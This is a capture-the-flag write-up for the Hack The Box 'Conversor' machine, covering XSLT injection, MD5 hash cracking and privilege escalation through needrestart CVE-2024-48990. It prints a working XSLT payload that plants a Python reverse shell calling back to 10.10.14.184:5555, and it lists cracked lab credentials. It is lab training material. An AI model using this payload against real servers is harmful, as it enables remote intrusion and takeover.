# Hack The Box: Conversor 

### Challenge Name: Conversor
**Difficulty:** Easy

<img width="760" height="629" alt="image" src="https://github.com/user-attachments/assets/ed76c9a5-466a-44db-a145-fe89504d1468" />



## Writeup:

To start, I ran nmap on the ip address to see what ports were exposed:

`nmap -sV 10.10.11.92`

<img width="772" height="275" alt="image" src="https://github.com/user-attachments/assets/45d99f48-8a68-4bff-8618-ab6079356a0c" />


So there is a webapplication running Apache and SSH. 
Without creds we won't be able to get in with SSH so lets take a look at the web app and see what we can find.

After playing around with the home page you should see that in the `/about` section of the page they give you the source code.
This is a pretty big hint that there is some bug in the code they want you to find.

<img width="934" height="781" alt="image" src="https://github.com/user-attachments/assets/b2ad3332-c3ca-46bf-9aa4-6b8fcd76f700" />

After reviewing the code 2 important files that gave away how to exploit the server was the `Install.md` and the `app.py`

In the Install.md:

```
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

It explicitly tells us that **if you want to run python scripts add it to /var/www/conversor.htb/scripts/*.py**


In the `Appy.py`

<img width="978" height="515" alt="image" src="https://github.com/user-attachments/assets/8387e475-f274-412c-8738-c6bbc2e3c589" />

They forgot to add the parser to sanatize the XSLT file. So we could use some XSLT injection trick to write a python file into the `/scripts` directory

The XML file can be whatever, it doesn't matter because the injection is just trhough the XSLT.

So my xslt file was:

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common" 
  extension-element-prefixes="exsl"
  version="1.0">
  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.184",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
</exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

This allowed me to get a reverse shell on the apache server!

`/etc/passwd` and `/home` show that there is a user account called **fismathack**. So this is the user account we need to target.

<img width="610" height="192" alt="image" src="https://github.com/user-attachments/assets/56e3eea0-975a-419d-83ee-bc376da88ef5" />

At the top of `app.py` there was a Database file where they were pulling the users from and they hashed the passwords with MD5.

This is a golden ticket for us to get some credentials!

<img width="454" height="262" alt="image" src="https://github.com/user-attachments/assets/dc0d9c1b-95eb-43ae-8ad0-cb0e11a1925d" />

From the users table we get the fismathack user!  

| ID | Username    | MD5 Hash                             |
|----|-------------|--------------------------------------|
| 1  | fismathack  | 5b5c3ac3a1c897c94caad48e6c71fdec     |
| 5  | test        | 098f6bcd4621d373cade4e832627b4f6     |
| 6  | bob         | 9f9d51bc70ef21ca5c14f307980a29d8     |
| 7  | cha0s       | 4297f44b13955235245b2497399d7a93     |
| 8  | elfa5d      | f2607116b5a7c97da401af32cf1d5f00     |
| 9  | potato      | 8ee2027983915ec78acc45027d874316     |
| 10 | qwe123      | 200820e3227815ed1756a6b531e7e0d2     |


I was able to crack the password as `Keepmesafeandwarm` with John
<img width="683" height="243" alt="image" src="https://github.com/user-attachments/assets/5ec71d5b-f8b9-47d5-ad8d-a3ecd2492a7c" />


I was able to successfully SSH with this account and get the user flag:

<img width="292" height="130" alt="image" src="https://github.com/user-attachments/assets/60d11567-ba6c-4ad3-a752-7f9f7d592dce" />


## Root Flag:

I uploaded `linpeas.sh` and saw that I was able to run the command `needrestart` with sudo permissions

<img width="549" height="253" alt="image" src="https://github.com/user-attachments/assets/b5ed5142-a72f-4275-8fd4-30c7e95d135a" />

Now this system is using `needrestart 3.7` which is vulnerable to **CVE-2024-48990**! 

There are mutliple public exploits for this version. I used a PoC from:
`https://github.com/makuga01/CVE-2024-48990-PoC` and was able to get the root shell

<img width="760" height="425" alt="image" src="https://github.com/user-attachments/assets/b1a81cf9-92e1-42b3-87cc-58d87a583496" />
